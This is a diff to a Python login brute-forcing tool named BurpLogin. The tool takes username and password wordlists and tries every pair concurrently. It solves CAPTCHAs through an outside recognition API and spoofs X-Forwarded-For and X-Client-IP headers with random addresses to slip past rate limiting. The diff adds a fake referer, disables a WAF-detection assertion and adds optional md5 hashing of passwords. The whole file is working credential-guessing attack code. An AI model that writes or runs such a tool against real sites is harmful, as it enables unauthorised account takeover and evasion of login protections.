@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding:utf8 -*-
-from queue import Empty
 from gevent import pool, queue, monkey;monkey.patch_all()
+from queue import Empty
 import requests
 import json
 import base64
@@ -11,6 +11,8 @@ import warnings
 import logging
 import time
 import threading
+import hashlib
+
 
 warnings.filterwarnings('ignore')
 logging.basicConfig(filename='logger.log', filemode='a', level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -29,6 +31,7 @@ class BurpLogin:
         self.request.verify = False
         self.request.headers.update({
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/87.0.4280.141 Safari/537.36",
+            "referer": "https://www.baidu.com/",
             "x-client-ip": "220.1.{}.{}".format(random.randint(1, 255), random.randint(1, 255)),
             "x-forwarded-for": "220.1.{}.{}".format(random.randint(1, 255), random.randint(1, 255))
         })
@@ -122,7 +125,6 @@ class BurpLogin:
                 if req.text.find(e) != -1:
                     return -1, req  # 验证码错误
         self.request.cookies.clear()
-        logging.debug(msg='### {}'.format(json.dumps(self.data)))
         return 1, req
 
     def __verify(self):
@@ -131,24 +133,28 @@ class BurpLogin:
         :return:
         """
         image_req = self.request.get(self.load_verify_code_url)
-        assert image_req.headers.get('Content-Type').find('image') != -1, 'This is not image,check it or waf ??'
+        # assert image_req.headers.get('Content-Type').find('image') != -1, 'This is not image,check it or waf ??'
         image_content = image_req.content
         image_base64 = base64.b64encode(image_content).decode("utf-8")
         payload = self.__config.get("verify_config").get("post")
         payload.update({
             "data": image_base64
         })
-        r = self.request.post(self.verify_api, json=payload)
-        r = r.json().get("msg")
+        rr = self.request.post(self.verify_api, json=payload)
+        rr = rr.json().get("msg")
         self.data.update({
-            self.verify_field_name: r
+            self.verify_field_name: rr
         })
 
 
 def status():
     while SIGN:
-        print('[+] verify_fail:{}----login_fail:{}----login_success:{}'.format(VERIFY_FAIL_TOTAL, LOGIN_FAIL_TOTAL, LOGIN_SUCCESS_TOTAL), end='\r')
+        print('[+] verify_code_fail:{}----login_fail:{}----login_success:{}'.format(VERIFY_FAIL_TOTAL, LOGIN_FAIL_TOTAL, LOGIN_SUCCESS_TOTAL), end='\r')
         time.sleep(1)
+
+
+def md5(_str):
+    return hashlib.new('md5', _str.encode("utf-8")).hexdigest()
 
 
 if __name__ == '__main__':
@@ -156,18 +162,25 @@ if __name__ == '__main__':
         print("请传入配置文路径")
         exit(0)
     file_path = sys.argv[1]
-    # file_path = 'Verify.json'
+    # file_path = 'Verify1.json'
     config = json.load(open(file_path, 'r', encoding='utf-8'))
     POOL = pool.Pool(config.get("speed"))
     QUEUE = queue.Queue(2000)
     threading.Thread(target=status).start()
     for e in range(config.get("speed")):
         POOL.apply_async(BurpLogin().run, args=(QUEUE,))
-    f_username = open('username.txt', 'r')
-    f_password = open('password.txt', 'r')
+    f_username = open(config.get('username_path'), 'r')
+    f_password = open(config.get('password_path'), 'r')
     for u in f_username:
         for p in f_password:
-            QUEUE.put([u.strip(), p.strip()])
+            p = p.strip()
+            u = u.strip()
+            # p = md5(md5(md5(u+p)))
+            try:
+                QUEUE.put([u.strip(), p])
+            except KeyboardInterrupt as e:
+                SIGN = False
+                exit(0)
         f_password.seek(0)
     f_username.close()
     f_password.close()
